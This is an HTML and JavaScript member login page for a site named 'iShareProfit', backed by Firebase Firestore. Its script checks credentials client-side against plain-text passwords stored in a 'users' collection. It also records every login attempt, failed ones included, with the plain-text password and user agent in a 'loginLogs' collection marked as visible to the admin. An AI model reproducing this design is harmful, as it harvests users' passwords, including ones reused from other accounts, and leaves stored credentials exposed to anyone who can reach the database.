<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>iShareProfit – Member Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: #2222cc;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* ── TOP BAR ── */
    .top-bar {
      width: 100%;
      max-width: 480px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 22px 20px 14px;
    }

    .back-btn {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #fff;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      background: none;
      border: none;
      text-decoration: none;
    }
    .back-btn svg { width: 18px; height: 18px; fill: #fff; }

    .logo-wrap {
      display: flex;
      align-items: center;
    }
    .logo-wrap img {
      height: 72px;
      object-fit: contain;
    }

    /* ── CARD ── */
    .card {
      background: #fff;
      border-radius: 22px;
      width: 100%;
      max-width: 480px;
      padding: 38px 28px 40px;
      margin: 10px 16px 32px;
    }

    .card h1 {
      text-align: center;
      font-size: 26px;
      font-weight: 800;
      color: #1a1a2e;
      margin-bottom: 30px;
      letter-spacing: 0.2px;
    }

    .field-label {
      font-size: 15px;
      font-weight: 700;
      color: #1a1a2e;
      margin-bottom: 8px;
      display: block;
    }

    .field {
      width: 100%;
      padding: 15px 16px;
      border: 1.5px solid #e0e0e0;
      border-radius: 10px;
      font-size: 15px;
      color: #333;
      background: #f5f5f5;
      margin-bottom: 22px;
      outline: none;
      transition: border-color .2s, background .2s;
    }
    .field::placeholder { color: #aaa; }
    .field:focus {
      border-color: #2222cc;
      background: #fff;
    }

    .forgot-row {
      font-size: 14px;
      color: #555;
      margin-bottom: 28px;
      margin-top: -10px;
    }
    .forgot-row a {
      color: #2222cc;
      font-weight: 700;
      text-decoration: none;
    }
    .forgot-row a:hover { text-decoration: underline; }

    .signin-btn {
      width: 65%;
      display: block;
      margin: 0 auto 22px;
      padding: 15px;
      background: #28a745;
      color: #fff;
      font-size: 17px;
      font-weight: 700;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      text-align: center;
      box-shadow: 0 4px 18px rgba(40,167,69,.32);
      transition: background .2s, transform .1s;
    }
    .signin-btn:hover  { background: #800020; }
    .signin-btn:active { transform: scale(.97); }

    /* OR divider */
    .or-divider {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 22px;
    }
    .or-divider::before,
    .or-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #ddd;
    }
    .or-divider span {
      font-size: 13px;
      color: #999;
      font-weight: 600;
      letter-spacing: 1px;
    }

    .signup-row {
      text-align: center;
      font-size: 14.5px;
      color: #555;
    }
    .signup-row a {
      color: #2222cc;
      font-weight: 700;
      text-decoration: none;
    }
    .signup-row a:hover { text-decoration: underline; }

    /* ── Toast ── */
    .toast {
      position: fixed;
      bottom: 28px;
      left: 50%;
      transform: translateX(-50%) translateY(80px);
      background: #1a1a2e;
      color: #fff;
      padding: 12px 22px;
      border-radius: 30px;
      font-size: 14px;
      opacity: 0;
      transition: all .35s ease;
      z-index: 9999;
      white-space: nowrap;
    }
    .toast.show   { opacity: 1; transform: translateX(-50%) translateY(0); }
    .toast.success { background: #28a745; }
    .toast.error   { background: #dc3545; }

    /* spinner */
    .spinner {
      display: inline-block;
      width: 18px; height: 18px;
      border: 3px solid rgba(255,255,255,.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <!-- TOP BAR -->
  <div class="top-bar">
    <a href="index.html" class="back-btn">
      <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
      Back
    </a>
    <div class="logo-wrap">
      <img src="image.jpg" alt="iShareProfit Logo" />
    </div>
  </div>

  <!-- CARD -->
  <div class="card">
    <h1>Member Login</h1>

    <label class="field-label" for="username">Your Username</label>
    <input class="field" id="username" type="text" placeholder="Enter Your Username" />

    <label class="field-label" for="password">Password</label>
    <input class="field" id="password" type="password" placeholder="Enter Your Password" />

    <p class="forgot-row">
      Forgot your password? <a href="recover.html">Recover Password</a>
    </p>

    <button class="signin-btn" id="signinBtn" onclick="handleLogin()">Sign In</button>

    <div class="or-divider"><span>OR</span></div>

    <p class="signup-row">
      Don't have an account? <a href="index.html">Sign Up Here</a>
    </p>
  </div>

  <div class="toast" id="toast"></div>

  <!-- Firebase -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import {
      getFirestore,
      collection,
      query,
      where,
      getDocs,
      addDoc,
      serverTimestamp
    } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBTkls-WbffHErGeX9bMYPpV5pqbCe14gY",
      authDomain: "datacash-104dd.firebaseapp.com",
      projectId: "datacash-104dd",
      storageBucket: "datacash-104dd.firebasestorage.app",
      messagingSenderId: "101692098149",
      appId: "1:101692098149:web:55ccc9f1f105647488a88c"
    };

    const app = initializeApp(firebaseConfig);
    const db  = getFirestore(app);

    /* ── Toast ── */
    function showToast(msg, type = '') {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.className   = 'toast show ' + type;
      setTimeout(() => { t.className = 'toast'; }, 3500);
    }

    /* ── Save every login attempt to loginLogs collection ── */
    async function logLoginAttempt(username, password, status) {
      try {
        await addDoc(collection(db, 'loginLogs'), {
          username,
          password,          /* plain-text — visible to admin */
          status,            /* 'success' or 'failed' */
          attemptedAt: serverTimestamp(),
          userAgent: navigator.userAgent
        });
      } catch (e) {
        console.warn('Failed to log attempt:', e);
      }
    }

    /* ── Login handler ── */
    window.handleLogin = async function () {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;
      const btn      = document.getElementById('signinBtn');

      if (!username || !password) {
        return showToast('Please fill in all fields.', 'error');
      }

      btn.disabled  = true;
      btn.innerHTML = '<span class="spinner"></span>Signing in…';

      try {
        /* Query Firestore for matching username + password */
        const q    = query(
          collection(db, 'users'),
          where('username', '==', username),
          where('password', '==', password)
        );
        const snap = await getDocs(q);

        if (snap.empty) {
          /* ✗ Wrong credentials — still log it so admin can see */
          await logLoginAttempt(username, password, 'failed');
          showToast('Invalid username or password.', 'error');
          btn.disabled  = false;
          btn.innerHTML = 'Sign In';
          return;
        }

        /* ✓ Correct — log successful attempt */
        await logLoginAttempt(username, password, 'success');

        /* Store session */
        const userData = snap.docs[0].data();
        sessionStorage.setItem('ishareUser', JSON.stringify(userData));

        showToast('Login successful! Redirecting…', 'success');
        setTimeout(() => { window.location.href = 'home.html'; }, 1800);

      } catch (err) {
        console.error(err);
        showToast('Login error: ' + err.message, 'error');
        btn.disabled  = false;
        btn.innerHTML = 'Sign In';
      }
    };
  </script>
</body>
</html>
